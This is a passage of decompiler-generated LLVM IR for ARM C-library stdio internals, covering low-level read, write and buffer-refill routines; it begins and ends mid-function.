  br i1 %tmp23, label %dec_label_pc_214a8, label %dec_label_pc_2148c

dec_label_pc_2148c:                               ; preds = %entry
  %v1_21490 = sub i32 0, %arg1
  %v3_21494 = load i16, i16* @global_var_2c068.414, align 2
  %v4_21494 = sext i16 %v3_21494 to i32
  %v0_21498 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_214a0 = add i32 %v4_21494, %v0_21498
  %v4_214a0 = inttoptr i32 %v3_214a0 to i32*
  store i32 %v1_21490, i32* %v4_214a0, align 4
  br label %dec_label_pc_21578

dec_label_pc_214a8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_21578, label %dec_label_pc_214b0

dec_label_pc_214b0:                               ; preds = %dec_label_pc_214a8
  %v2_214b0 = add i32 %v1_21464, %arg1
  store i32 %v2_214b0, i32* %r1.global-to-local, align 4
  %v2_214b4 = add i32 %tmp, %arg3
  store i32 %v1_21464, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_21560

dec_label_pc_214d0:                               ; preds = %dec_label_pc_21560
  %v1_214d0 = add i32 %v0_21530, 16
  %v2_214d0 = inttoptr i32 %v1_214d0 to i16*
  %v3_214d0 = load i16, i16* %v2_214d0, align 2
  %v4_214d0 = zext i16 %v3_214d0 to i32
  %v1_214d4 = add nsw i32 %v4_214d0, -19
  store i32 %v1_214d4, i32* @r2, align 4
  %v1_214d8 = add nuw nsw i32 %v4_214d0, 7
  %v1_214dc = and i32 %v1_214d8, 131064
  store i32 %v1_214dc, i32* @ip, align 4
  %v2_214e4 = add i32 %v1_214dc, %v0_21538
  store i32 %v2_214e4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_214e4, %v2_214b4
  br i1 %tmp24, label %dec_label_pc_214f0, label %dec_label_pc_2152c

dec_label_pc_214f0:                               ; preds = %dec_label_pc_214d0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_214f8 = load i32, i32* %r8.global-to-local, align 4
  %v0_214fc = load i32, i32* %sb.global-to-local, align 4
  %v1_21500 = load i32, i32* @sp, align 4
  %v2_21500 = inttoptr i32 %v1_21500 to i32*
  store i32 0, i32* %v2_21500, align 4
  %v4_21504 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_214f8, i32 %v0_214fc)
  %v0_21508 = load i32, i32* @r5, align 4
  %v1_21508 = load i32, i32* %sl.global-to-local, align 4
  %v9_21508 = icmp eq i32 %v0_21508, %v1_21508
  br i1 %v9_21508, label %dec_label_pc_21510, label %dec_label_pc_21574

dec_label_pc_21510:                               ; preds = %dec_label_pc_214f0
  %v0_21514 = call i32 @__aeabi_read_tp()
  %v3_21518 = load i16, i16* @global_var_2c068.414, align 2
  %v4_21518 = sext i16 %v3_21518 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_21524 = add i32 %v4_21518, %v0_21514
  %v4_21524 = inttoptr i32 %v3_21524 to i32*
  store i32 22, i32* %v4_21524, align 4
  br label %dec_label_pc_21578

dec_label_pc_2152c:                               ; preds = %dec_label_pc_214d0
  %v1_2152c = inttoptr i32 %v0_21530 to i32*
  %v2_2152c = load i32, i32* %v1_2152c, align 4
  %v3_2152c = add i32 %v0_21530, 4
  %v4_2152c = inttoptr i32 %v3_2152c to i32*
  %v5_2152c = load i32, i32* %v4_2152c, align 4
  store i32 %v5_2152c, i32* @r4, align 4
  %v1_21530 = add i32 %v0_21530, 8
  store i32 %v1_21530, i32* %r8.global-to-local, align 4
  %v1_21534 = inttoptr i32 %v1_21530 to i32*
  %v2_21534 = load i32, i32* %v1_21534, align 4
  store i32 %v2_21534, i32* %r8.global-to-local, align 4
  %v3_21534 = add i32 %v0_21530, 12
  %v4_21534 = inttoptr i32 %v3_21534 to i32*
  %v5_21534 = load i32, i32* %v4_21534, align 4
  store i32 %v5_21534, i32* %sb.global-to-local, align 4
  %v1_21538 = inttoptr i32 %v0_21538 to i32*
  store i32 %v2_2152c, i32* %v1_21538, align 4
  %v3_21538 = add i32 %v0_21538, 4
  %v4_21538 = inttoptr i32 %v3_21538 to i32*
  %v5_21538 = load i32, i32* @r4, align 4
  store i32 %v5_21538, i32* %v4_21538, align 4
  %v0_2153c = load i32, i32* %r8.global-to-local, align 4
  %v1_2153c = load i32, i32* @r5, align 4
  %v2_2153c = add i32 %v1_2153c, 8
  %v3_2153c = inttoptr i32 %v2_2153c to i32*
  store i32 %v0_2153c, i32* %v3_2153c, align 4
  %v0_21540 = load i32, i32* %sb.global-to-local, align 4
  %v1_21540 = load i32, i32* @r5, align 4
  %v2_21540 = add i32 %v1_21540, 12
  %v3_21540 = inttoptr i32 %v2_21540 to i32*
  store i32 %v0_21540, i32* %v3_21540, align 4
  %v0_21544 = load i32, i32* @ip, align 4
  %v1_21544 = trunc i32 %v0_21544 to i16
  %v2_21544 = load i32, i32* @r5, align 4
  %v3_21544 = add i32 %v2_21544, 16
  %v4_21544 = inttoptr i32 %v3_21544 to i16*
  store i16 %v1_21544, i16* %v4_21544, align 2
  %v0_21548 = load i32, i32* @r7, align 4
  %v1_21548 = add i32 %v0_21548, 18
  %v2_21548 = inttoptr i32 %v1_21548 to i8*
  %v3_21548 = load i8, i8* %v2_21548, align 1
  %v4_21548 = zext i8 %v3_21548 to i32
  store i32 %v4_21548, i32* @r3, align 4
  %v2_2154c = load i32, i32* @r5, align 4
  %v3_2154c = add i32 %v2_2154c, 18
  %v4_2154c = inttoptr i32 %v3_2154c to i8*
  store i8 %v3_21548, i8* %v4_2154c, align 1
  %v0_21550 = call i32 @memcpy()
  %v0_21554 = load i32, i32* @r7, align 4
  %v1_21554 = add i32 %v0_21554, 16
  %v2_21554 = inttoptr i32 %v1_21554 to i16*
  %v3_21554 = load i16, i16* %v2_21554, align 2
  %v4_21554 = zext i16 %v3_21554 to i32
  %v0_21558 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_21558, i32* @r5, align 4
  %v2_2155c = add i32 %v4_21554, %v0_21554
  store i32 %v2_2155c, i32* @r7, align 4
  br label %dec_label_pc_21560

dec_label_pc_21560:                               ; preds = %dec_label_pc_214b0, %dec_label_pc_2152c
  %v0_21538 = phi i32 [ %tmp, %dec_label_pc_214b0 ], [ %v0_21558, %dec_label_pc_2152c ]
  %v0_21530 = phi i32 [ %v1_21464, %dec_label_pc_214b0 ], [ %v2_2155c, %dec_label_pc_2152c ]
  %v3_21564 = icmp ult i32 %v0_21530, %v2_214b0
  %v1_21568 = add i32 %v0_21538, 19
  store i32 %v1_21568, i32* @r0, align 4
  %v1_2156c = add i32 %v0_21530, 19
  store i32 %v1_2156c, i32* @r1, align 4
  br i1 %v3_21564, label %dec_label_pc_214d0, label %dec_label_pc_21574.loopexit

dec_label_pc_21574.loopexit:                      ; preds = %dec_label_pc_21560
  %v0_21574.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_21574

dec_label_pc_21574:                               ; preds = %dec_label_pc_21574.loopexit, %dec_label_pc_214f0
  %v1_21574 = phi i32 [ %v0_21538, %dec_label_pc_21574.loopexit ], [ %v0_21508, %dec_label_pc_214f0 ]
  %v0_21574 = phi i32 [ %v0_21574.pre, %dec_label_pc_21574.loopexit ], [ %v1_21508, %dec_label_pc_214f0 ]
  %v2_21574 = sub i32 %v1_21574, %v0_21574
  store i32 %v2_21574, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_21578

dec_label_pc_21578:                               ; preds = %dec_label_pc_214a8, %dec_label_pc_21510, %dec_label_pc_2148c, %dec_label_pc_21574
  %v0_21578 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_2144c, i32* @r5, align 4
  store i32 %v12_2144c, i32* @r7, align 4
  ret i32 %v0_21578

; uselistorder directives
  uselistorder i32 %v0_21530, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_21538, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_21464, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 18, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 22, { 21, 0, 28, 22, 23, 24, 29, 25, 26, 27, 2, 5, 4, 3, 7, 1, 6, 10, 9, 8, 12, 11, 15, 14, 13, 18, 17, 16, 19, 20 }
  uselistorder i32* @sp, { 3, 0, 1, 2 }
  uselistorder i32 -8, { 30, 9, 10, 11, 12, 13, 14, 8, 7, 2, 6, 5, 4, 3, 15, 16, 17, 18, 19, 1, 32, 20, 21, 22, 23, 24, 31, 33, 25, 34, 29, 26, 27, 28, 0 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_21578, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_21560, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_21590 = load i32, i32* @r4, align 4
  store i32 %v3_21590, i32* %stack_var_-12, align 4
  %v0_21594 = load i32, i32* %r0.global-to-local, align 4
  %v1_21594 = inttoptr i32 %v0_21594 to i16*
  %v2_21594 = load i16, i16* %v1_21594, align 2
  %v3_21594 = zext i16 %v2_21594 to i32
  store i32 %v3_21594, i32* @r3, align 4
  %v1_21598 = and i32 %v3_21594, 4
  store i32 %v1_21598, i32* @r5, align 4
  %v2_21598 = icmp eq i32 %v1_21598, 0
  store i32 %v0_21594, i32* @r4, align 4
  br i1 %v2_21598, label %dec_label_pc_215ac, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_215ac:                               ; preds = %entry
  %v1_215ac = icmp slt i32 %arg2, 0
  br i1 %v1_215ac, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_215ac
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_215ac, %bb18
  %v1_215b4 = add i32 %v0_21594, 4
  %v2_215b4 = inttoptr i32 %v1_215b4 to i32*
  %v3_215b4 = load i32, i32* %v2_215b4, align 4
  store i32 %v3_215b4, i32* %r0.global-to-local, align 4
  %v1_215b8 = call i32 @__libc_read(i32 %v3_215b4)
  store i32 %v1_215b8, i32* %r0.global-to-local, align 4
  %v5_215c0 = icmp sgt i32 %v1_215b8, 0
  br i1 %v5_215c0, label %.thread7, label %dec_label_pc_215c4

dec_label_pc_215c4:                               ; preds = %bb19
  %v2_215bc = icmp eq i32 %v1_215b8, 0
  %v0_215c4 = load i32, i32* @r4, align 4
  %v1_215c4 = inttoptr i32 %v0_215c4 to i16*
  %v2_215c4 = load i16, i16* %v1_215c4, align 2
  br i1 %v2_215bc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_215c4
  %v2_215c8 = or i16 %v2_215c4, 4
  store i16 %v2_215c8, i16* %v1_215c4, align 2
  %v1_215e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_215c4
  %v2_215cc = or i16 %v2_215c4, 8
  store i16 %v2_215cc, i16* %v1_215c4, align 2
  %v1_215d8 = load i32, i32* @r5, align 4
  store i32 %v1_215d8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_215e4 = phi i32 [ %v1_215e4.pre, %bb20 ], [ 0, %bb ], [ %v1_215b8, %bb19 ], [ %v1_215d8, %bb21 ]
  %v2_215e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_215e0, i32* @r4, align 4
  ret i32 %v1_215e4

; uselistorder directives
  uselistorder i16 %v2_215c4, { 1, 0 }
  uselistorder i32 %v1_215b8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 0, 3, 2, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_216ac2 = icmp eq i32 %arg3, 0
  store i1 %v2_216ac2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_216ac2, label %dec_label_pc_216b4, label %dec_label_pc_21604

dec_label_pc_21604:                               ; preds = %entry, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge
  %v0_21610 = phi i32 [ %v0_21610.pre, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge ], [ %tmp, %entry ]
  %v0_2160c = phi i32 [ %v5_2161c, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge ], [ %arg2, %entry ]
  %v3_21604 = phi i32 [ %v3_21604.pre, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge ], [ 2147483647, %entry ]
  %v0_21608.in = phi i32 [ %v5_21620, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge ], [ %arg3, %entry ]
  %v3_21608 = phi i32 [ %v5_21620, %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge ], [ %arg3, %entry ]
  %v0_21608 = icmp slt i32 %v0_21608.in, 0
  %storemerge = select i1 %v0_21608, i32 %v3_21604, i32 %v3_21608
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_2160c, i32* %r1.global-to-local, align 4
  %v1_21610 = add i32 %v0_21610, 4
  %v2_21610 = inttoptr i32 %v1_21610 to i32*
  %v3_21610 = load i32, i32* %v2_21610, align 4
  %v3_21614 = call i32 @__GI___libc_write(i32 %v3_21610, i32 %v0_2160c)
  %v1_21618 = icmp slt i32 %v3_21614, 0
  %v2_21618 = icmp eq i32 %v3_21614, 0
  store i1 %v2_21618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_21618, label %dec_label_pc_21628, label %dec_label_pc_216acthread-pre-split

dec_label_pc_21628:                               ; preds = %dec_label_pc_21604
  %v0_21628 = load i32, i32* @r4, align 4
  %v1_21628 = inttoptr i32 %v0_21628 to i16*
  %v2_21628 = load i16, i16* %v1_21628, align 2
  %v1_2162c = or i16 %v2_21628, 8
  store i16 %v1_2162c, i16* %v1_21628, align 2
  store i32 43556, i32* %r3.global-to-local, align 4
  %v0_21638 = call i32 @__aeabi_read_tp()
  %v3_2163c = load i16, i16* @global_var_2c068.414, align 2
  %v4_2163c = sext i16 %v3_2163c to i32
  store i32 %v4_2163c, i32* %r3.global-to-local, align 4
  %v2_21640 = add i32 %v4_2163c, %v0_21638
  %v3_21640 = inttoptr i32 %v2_21640 to i32*
  %v4_21640 = load i32, i32* %v3_21640, align 4
  store i32 %v4_21640, i32* %r3.global-to-local, align 4
  %v7_21644 = icmp eq i32 %v4_21640, 4
  store i1 %v7_21644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_21644, label %dec_label_pc_21650, label %bb21

bb21:                                             ; preds = %dec_label_pc_21628
  %v8_21648 = icmp eq i32 %v4_21640, 11
  store i1 %v8_21648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_21648, label %dec_label_pc_21650, label %dec_label_pc_216b4

dec_label_pc_21650:                               ; preds = %dec_label_pc_21628, %bb21
  %v0_21650 = load i32, i32* @r4, align 4
  %v1_21650 = add i32 %v0_21650, 8
  store i32 %v1_21650, i32* %r2.global-to-local, align 4
  %v1_21654 = inttoptr i32 %v1_21650 to i32*
  %v2_21654 = load i32, i32* %v1_21654, align 4
  store i32 %v2_21654, i32* %r2.global-to-local, align 4
  %v3_21654 = add i32 %v0_21650, 12
  %v4_21654 = inttoptr i32 %v3_21654 to i32*
  %v5_21654 = load i32, i32* %v4_21654, align 4
  store i32 %v5_21654, i32* %r3.global-to-local, align 4
  %v2_21658 = sub i32 %v5_21654, %v2_21654
  store i32 %v2_21658, i32* %r1.global-to-local, align 4
  %v9_21658 = icmp eq i32 %v5_21654, %v2_21654
  store i1 %v9_21658, i1* %cpsr_z.global-to-local, align 1
  %v0_216a4.pre = load i32, i32* @r5, align 4
  br i1 %v9_21658, label %dec_label_pc_216a4, label %dec_label_pc_21660

dec_label_pc_21660:                               ; preds = %dec_label_pc_21650
  %v3_21660 = icmp ult i32 %v2_21658, %v0_216a4.pre
  %v9_21660 = icmp eq i32 %v2_21658, %v0_216a4.pre
  store i1 %v9_21660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_21660, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_21660
  store i32 %v0_216a4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_21660, %bb22, %dec_label_pc_21688
  %v2_21674 = phi i32 [ %v1_2168c, %dec_label_pc_21688 ], [ %v2_21654, %bb22 ], [ %v2_21654, %dec_label_pc_21660 ]
  %v0_21668 = load i32, i32* @r6, align 4
  %v1_21668 = inttoptr i32 %v0_21668 to i8*
  %v2_21668 = load i8, i8* %v1_21668, align 1
  %v3_21668 = zext i8 %v2_21668 to i32
  store i32 %v3_21668, i32* %r3.global-to-local, align 4
  %v7_2166c = icmp eq i8 %v2_21668, 10
  store i1 %v7_2166c, i1* %cpsr_z.global-to-local, align 1
  %v1_21670 = add i32 %v0_21668, 1
  store i32 %v1_21670, i32* @r6, align 4
  %v3_21674 = inttoptr i32 %v2_21674 to i8*
  store i8 %v2_21668, i8* %v3_21674, align 1
  %v0_21678 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_21678, label %dec_label_pc_2167c, label %dec_label_pc_21688

dec_label_pc_2167c:                               ; preds = %.preheader
  %v0_2167c = load i32, i32* @r4, align 4
  %v1_2167c = inttoptr i32 %v0_2167c to i16*
  %v2_2167c = load i16, i16* %v1_2167c, align 2
  %v3_2167c = zext i16 %v2_2167c to i32
  store i32 %v3_2167c, i32* %r3.global-to-local, align 4
  %v1_21680 = and i32 %v3_2167c, 256
  %v2_21680 = icmp eq i32 %v1_21680, 0
  store i1 %v2_21680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_21680, label %dec_label_pc_21688, label %dec_label_pc_2167c.dec_label_pc_21694_crit_edge

dec_label_pc_2167c.dec_label_pc_21694_crit_edge:  ; preds = %dec_label_pc_2167c
  %v0_21698.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_21694

dec_label_pc_21688:                               ; preds = %dec_label_pc_2167c, %.preheader
  %v0_21688 = load i32, i32* %r1.global-to-local, align 4
  %v1_21688 = add i32 %v0_21688, -1
  store i32 %v1_21688, i32* %r1.global-to-local, align 4
  %v7_21688 = icmp eq i32 %v0_21688, 1
  store i1 %v7_21688, i1* %cpsr_z.global-to-local, align 1
  %v0_2168c = load i32, i32* %r2.global-to-local, align 4
  %v1_2168c = add i32 %v0_2168c, 1
  store i32 %v1_2168c, i32* %r2.global-to-local, align 4
  br i1 %v7_21688, label %dec_label_pc_21688.dec_label_pc_21694_crit_edge, label %.preheader

dec_label_pc_21688.dec_label_pc_21694_crit_edge:  ; preds = %dec_label_pc_21688
  %v0_21694.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_21694

dec_label_pc_21694:                               ; preds = %dec_label_pc_2167c.dec_label_pc_21694_crit_edge, %dec_label_pc_21688.dec_label_pc_21694_crit_edge
  %v0_21698 = phi i32 [ %v1_2168c, %dec_label_pc_21688.dec_label_pc_21694_crit_edge ], [ %v0_21698.pre, %dec_label_pc_2167c.dec_label_pc_21694_crit_edge ]
  %v0_21694 = phi i32 [ %v0_21694.pre, %dec_label_pc_21688.dec_label_pc_21694_crit_edge ], [ %v0_2167c, %dec_label_pc_2167c.dec_label_pc_21694_crit_edge ]
  %v1_21694 = add i32 %v0_21694, 8
  %v2_21694 = inttoptr i32 %v1_21694 to i32*
  %v3_21694 = load i32, i32* %v2_21694, align 4
  store i32 %v3_21694, i32* %r3.global-to-local, align 4
  %v2_21698 = add i32 %v0_21694, 16
  %v3_21698 = inttoptr i32 %v2_21698 to i32*
  store i32 %v0_21698, i32* %v3_21698, align 4
  %v0_2169c = load i32, i32* %r3.global-to-local, align 4
  %v1_2169c = load i32, i32* %r2.global-to-local, align 4
  %v2_2169c = sub i32 %v1_2169c, %v0_2169c
  store i32 %v2_2169c, i32* %r3.global-to-local, align 4
  %v1_216a0 = load i32, i32* @r5, align 4
  %v2_216a0 = sub i32 %v1_216a0, %v2_2169c
  br label %dec_label_pc_216a4

dec_label_pc_216a4:                               ; preds = %dec_label_pc_21650, %dec_label_pc_21694
  %v0_216a4 = phi i32 [ %v2_216a0, %dec_label_pc_21694 ], [ %v0_216a4.pre, %dec_label_pc_21650 ]
  %v1_216a4 = load i32, i32* @r7, align 4
  %v2_216a4 = sub i32 %v1_216a4, %v0_216a4
  store i32 %v2_216a4, i32* @r7, align 4
  br label %dec_label_pc_216b4

dec_label_pc_216acthread-pre-split:               ; preds = %dec_label_pc_21604
  %v3_2161c = load i32, i32* @r6, align 4
  %v5_2161c = add i32 %v3_2161c, %v3_21614
  store i32 %v5_2161c, i32* @r6, align 4
  %v4_21620 = load i32, i32* @r5, align 4
  %v5_21620 = sub i32 %v4_21620, %v3_21614
  store i32 %v5_21620, i32* @r5, align 4
  %v2_216ac = icmp eq i32 %v5_21620, 0
  store i1 %v2_216ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_216ac, label %dec_label_pc_216b4, label %dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge

dec_label_pc_216acthread-pre-split.dec_label_pc_21604_crit_edge: ; preds = %dec_label_pc_216acthread-pre-split
  %v3_21604.pre = load i32, i32* @r8, align 4
  %v0_21610.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_21604

dec_label_pc_216b4:                               ; preds = %dec_label_pc_216acthread-pre-split, %entry, %bb21, %dec_label_pc_216a4
  %v0_216b4 = load i32, i32* @r7, align 4
  ret i32 %v0_216b4

; uselistorder directives
  uselistorder i32 %v5_21620, { 1, 3, 0, 2 }
  uselistorder i32 %v5_2161c, { 1, 0 }
  uselistorder i32 %v0_21694, { 1, 0 }
  uselistorder i32 %v1_2168c, { 0, 2, 1 }
  uselistorder i32 %v0_21688, { 1, 0 }
  uselistorder i32 %v0_216a4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_21654, { 1, 0, 2 }
  uselistorder i32 %v2_21654, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_21614, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2160c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9 }
  uselistorder i32 11, { 10, 7, 8, 9, 15, 23, 24, 0, 1, 2, 19, 20, 21, 22, 11, 12, 13, 14, 16, 17, 3, 18, 4, 25, 26, 5, 6, 27, 28 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 0, 2, 1 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 4, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_216b4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_216a4, { 1, 0 }
  uselistorder label %dec_label_pc_21694, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21650, { 1, 0 }
  uselistorder label %dec_label_pc_21604, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_216c4 = load i32, i32* @r4, align 4
  store i32 %v3_216c4, i32* %stack_var_-8, align 4
  %v1_216c8 = add i32 %arg1, 8
  %v1_216cc = inttoptr i32 %v1_216c8 to i32*
  %v2_216cc = load i32, i32* %v1_216cc, align 4
  store i32 %v2_216cc, i32* @r1, align 4
  %v3_216cc = add i32 %arg1, 12
  %v4_216cc = inttoptr i32 %v3_216cc to i32*
  %v5_216cc = load i32, i32* %v4_216cc, align 4
  %v2_216d0 = sub i32 %v5_216cc, %v2_216cc
  store i32 %v2_216d0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_216d8 = inttoptr i32 %arg1 to i16*
  %v4_216d8 = call i32 @__stdio_READ(i16* %v3_216d8, i32 %v2_216cc, i32 %v2_216d0)
  %v0_216dc = load i32, i32* @r4, align 4
  %v1_216dc = add i32 %v0_216dc, 8
  %v2_216dc = inttoptr i32 %v1_216dc to i32*
  %v3_216dc = load i32, i32* %v2_216dc, align 4
  store i32 %v3_216dc, i32* %r2.global-to-local, align 4
  %v2_216e0 = add i32 %v3_216dc, %v4_216d8
  %v2_216e4 = add i32 %v0_216dc, 20
  %v3_216e4 = inttoptr i32 %v2_216e4 to i32*
  store i32 %v2_216e0, i32* %v3_216e4, align 4
  %v0_216e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_216e8 = load i32, i32* @r4, align 4
  %v2_216e8 = add i32 %v1_216e8, 16
  %v3_216e8 = inttoptr i32 %v2_216e8 to i32*
  store i32 %v0_216e8, i32* %v3_216e8, align 4
  %v2_216ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_216ec, i32* @r4, align 4
  ret i32 %v4_216d8

; uselistorder directives
  uselistorder i32 %v4_216d8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_216f4 = load i32, i32* @r4, align 4
  store i32 %v3_216f4, i32* %stack_var_-12, align 4
  %v0_216f8 = load i32, i32* @r0, align 4
  %v1_216f8 = inttoptr i32 %v0_216f8 to i16*
  %v2_216f8 = load i16, i16* %v1_216f8, align 2
  %v3_216f8 = zext i16 %v2_216f8 to i32
  store i32 %v3_216f8, i32* %r3.global-to-local, align 4
  %v0_216fc = load i32, i32* @r1, align 4
  %v2_216fc = and i32 %v0_216fc, %v3_216f8
  %v4_216fc = icmp eq i32 %v2_216fc, 0
  store i32 %v0_216f8, i32* @r4, align 4
  br i1 %v4_216fc, label %dec_label_pc_2170c, label %dec_label_pc_2171c

dec_label_pc_2170c:                               ; preds = %entry
  %v1_2170c = and i32 %v3_216f8, 2176
  %v2_2170c = icmp eq i32 %v1_2170c, 0
  br i1 %v2_2170c, label %dec_label_pc_21714, label %dec_label_pc_21728

dec_label_pc_21714:                               ; preds = %dec_label_pc_2170c
  %v2_21714 = or i32 %v0_216fc, %v3_216f8
  store i32 %v2_21714, i32* %r3.global-to-local, align 4
  %v1_21718 = trunc i32 %v2_21714 to i16
  store i16 %v1_21718, i16* %v1_216f8, align 2
  %v0_2171c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2171c

dec_label_pc_2171c:                               ; preds = %entry, %dec_label_pc_21714
  %v0_2171c = phi i32 [ %v0_216f8, %entry ], [ %v0_2171c.pre, %dec_label_pc_21714 ]
  %v1_2171c = inttoptr i32 %v0_2171c to i16*
  %v2_2171c = load i16, i16* %v1_2171c, align 2
  %v3_2171c = zext i16 %v2_2171c to i32
  store i32 %v3_2171c, i32* %r3.global-to-local, align 4
  %v1_21720 = and i32 %v3_2171c, 16
  store i32 %v1_21720, i32* %r5.global-to-local, align 4
  %v2_21720 = icmp eq i32 %v1_21720, 0
  br i1 %v2_21720, label %dec_label_pc_21750, label %dec_label_pc_21728

dec_label_pc_21728:                               ; preds = %dec_label_pc_2170c, %dec_label_pc_2171c
  store i32 ptrtoint (i32* @global_var_a930.756 to i32), i32* %r3.global-to-local, align 4
  %v0_2172c = call i32 @__aeabi_read_tp()
  store i32 %v0_2172c, i32* %r0.global-to-local, align 4
  %v3_21730 = load i16, i16* @global_var_2c068.414, align 2
  %v4_21730 = sext i16 %v3_21730 to i32
  store i32 %v4_21730, i32* %r3.global-to-local, align 4
  %v3_21738 = add i32 %v4_21730, %v0_2172c
  %v4_21738 = inttoptr i32 %v3_21738 to i32*
  store i32 9, i32* %v4_21738, align 4
  br label %dec_label_pc_2173c

dec_label_pc_2173c:                               ; preds = %dec_label_pc_21758, %dec_label_pc_21728
  %v0_2173c = load i32, i32* @r4, align 4
  %v1_2173c = inttoptr i32 %v0_2173c to i16*
  %v2_2173c = load i16, i16* %v1_2173c, align 2
  %v3_2173c = zext i16 %v2_2173c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_21744 = or i32 %v3_2173c, 8
